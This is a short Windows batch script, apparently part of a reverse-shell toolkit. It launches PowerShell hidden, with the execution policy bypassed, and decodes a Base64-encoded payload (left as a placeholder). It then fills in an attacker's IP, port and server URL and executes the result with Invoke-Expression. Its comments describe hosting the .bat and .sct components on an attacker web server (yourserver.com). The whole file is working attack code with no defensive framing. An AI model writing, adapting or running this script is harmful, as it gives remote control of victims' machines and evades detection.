# Replace <Base64_encoded_string> with the actual Base64 encoded string from the previous step.
# Host both run_reverse_shell.bat and reverse_shell.sct on a web server. Ensure they are accessible via HTTP or HTTPS, e.g
# http://yourserver.com/run_reverse_shell.bat and http://yourserver.com/reverse_shell.sct.

@echo off
set ip=%1
set port=%2
set serverUrl=http://yourserver.com

powershell -NoP -NonI -W Hidden -Exec Bypass -Command ^
  "$encodedScript = '<Base64_encoded_string>'; ^
  $decodedScript = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encodedScript)); ^
  Invoke-Expression ($decodedScript -replace '\$ip', '%ip%' -replace '\$port', '%port%' -replace '\$serverUrl', '%serverUrl%')"

